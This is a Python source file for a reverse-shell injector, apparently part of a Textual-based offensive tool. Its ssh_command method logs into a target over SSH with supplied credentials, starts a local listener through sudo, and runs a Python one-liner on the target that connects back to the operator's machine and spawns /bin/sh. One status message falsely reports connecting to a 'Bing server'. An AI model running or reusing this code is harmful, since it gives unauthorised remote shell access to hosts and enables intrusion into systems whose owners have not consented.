import paramiko
import subprocess
from textual.widgets import TextLog
import socket
import os

class OpenSH():
    def __init__(self) -> None:
        pass

    def ssh_command(self,ip:str,t:TextLog,user:str,passwd:str,srvP,p):
        """Start and inject a reverse shell"""
        c = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        c.connect(("8.8.8.8", 80))
        ipv4=c.getsockname()[0]
        try:
            os.environ["DISPLAY"] =":0.0"
            f=subprocess.check_output(["id -un 1000"],shell=True)
            t.write(f.decode().strip())
            t.write("Connecting to SSH server . . .")
            d=subprocess.Popen([f"sudo -u {f.decode().strip()} xterm -e python3 RevShListener.py {srvP}"],shell=True)
            client=paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip,port=p,username=user,password=passwd)
            t.write("Connecting to Bing server server . . .")
            _,stdout,stderr=client.exec_command(f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ipv4}\",{srvP}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
            t.write("Connected")
            output=stdout.readlines() + stderr.readlines()
            t.write("done")
            if output:
                t.write("---Output---")
                for line in output:
                        t.write(line.strip())
        except:
             t.write("Error: Invalid Data or broken connection")
